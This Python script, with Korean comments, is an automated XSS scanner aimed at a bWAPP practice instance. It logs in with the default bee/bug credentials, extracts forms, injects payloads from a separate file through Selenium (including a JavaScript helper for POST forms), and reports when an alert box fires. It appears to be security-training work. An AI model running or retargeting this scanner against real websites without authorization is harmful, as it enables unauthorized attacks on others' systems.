# pip install --upgrade pip
import requests
from urllib.parse import urljoin, urlencode
from bs4 import BeautifulSoup
from pprint import pprint

from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions

base_url = "https://bwapp.hakhub.net"
target_url = f"{base_url}/xss_get.php"  # xss_get.php, xss_post.php
login_url = f"{base_url}/login.php"
xss_payload = "xss_payloads.txt"


def get_cookie():
    """
    계정 정보로 로그인하여 쿠키 반환
    """
    with requests.Session() as s:
        data = {
            "login": "bee",
            "password": "bug",
            "security_level": "0",
            "form": "submit",
        }
        s.post(login_url, data=data, verify=False)
        return s.cookies.get_dict()


def load_driver():
    """
    크롬 드라이버 객체 반환 및
    필요에 따라 디버그 옵션 설정
    """
    options = webdriver.ChromeOptions()
    options.add_experimental_option(
        "excludeSwitches", ["enable-logging"]
    )  # 시스템에 부착된 장치 오류 제거
    options.add_argument("window-size=1920,1080")  # 창의 크기
    options.add_argument("lang=ko_KR")  # 한국어
    return webdriver.Chrome(options=options)


def get_forms(url):
    """
    BeautifulSoup으로 form 태그를 모두 반환
    """
    page_content = requests.get(url, cookies=cookies, verify=False).content
    soup = BeautifulSoup(page_content, "html.parser")
    return soup.find_all("form")


def get_form_details(form):
    details = {}
    # form의 이동할 action url
    action = form.attrs.get("action")
    # form method (GET, POST, etc...)
    method = form.attrs.get("method", "get").lower()
    # get all the input details such as type and name
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def get_payloads():
    payloads = []
    with open(xss_payload, "r", encoding="utf-8") as vector_file:
        for vector in vector_file.read().splitlines():
            payloads.append(vector)
    return payloads


def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    joined_url = ""
    inputs = form_details["inputs"]
    # 공격 인자 값 가져오기
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value

    try:
        driver.switch_to.window(driver.current_window_handle)
        if form_details["method"] == "get":
            joined_url = target_url + "?" + urlencode(data)
            driver.get(joined_url)
            WebDriverWait(driver, 0.1).until(expected_conditions.alert_is_present())
            driver.switch_to.alert.accept()
        elif form_details["method"] == "post":
            # POST Method 사용을 위한 자바스크립트 함수 추가
            inject_post_function = """function post_to_url(path, params, method) {
    method = method || "post";

    let form = document.createElement("form");
    form._submit_function_ = form.submit;

    form.setAttribute("method", method);
    form.setAttribute("action", path);

    for(let key in params) {
        let hiddenField = document.createElement("input");
        hiddenField.setAttribute("type", "hidden");
        hiddenField.setAttribute("name", key);
        hiddenField.setAttribute("value", params[key]);

        form.appendChild(hiddenField);
    }

    document.body.appendChild(form);
    form._submit_function_(); //Call the renamed function.
}
post_to_url(arguments[0], arguments[1]);
            """
            # arguments[0], arguments[1] 인자 값 전달
            driver.execute_script(inject_post_function, target_url, data)

            # alert 창을 찾을 때 까지 0.1초간 기다림
            WebDriverWait(driver, 0.1).until(expected_conditions.alert_is_present())
            # 경고창 닫기
            driver.switch_to.alert.accept()
    except Exception:
        # alert 창을 닫는데 실패하면 XSS 없음
        pass
    else:
        # alert 창을 닫는데 성공하면 XSS 발견
        print("[[ Found XSS!! ]]")
        # payload 출력
        if form_details["method"] == "get":
            print("[ GET Method ]")
            print(urlencode(data))
            print(f"URL: {joined_url}")
        elif form_details["method"] == "post":
            print("[ POST Method ]")
            print("[ Params ]")
            pprint(data)
            print(f"URL: {target_url}")
        print("=" * 50)

        # 추가적인 Alert 창을 모두 닫기
        check_alert = None
        while check_alert is None:
            try:
                driver.switch_to.alert.accept()
            except:
                check_alert = True


if __name__ == "__main__":
    cookies = get_cookie()
    print(f"Cookies: {cookies}")
    driver = load_driver()
    # 브라우저 초기화
    driver.get(login_url)
    # 쿠키 설정
    for key, value in cookies.items():
        driver.add_cookie({"name": key, "value": value})
    driver.get(target_url)
    forms = get_forms(target_url)
    for form in forms:
        form_details = get_form_details(form)
        print(form_details)
        payloads = get_payloads()
        for payload in payloads:
            submit_form(form_details, base_url, payload)
    driver.close()
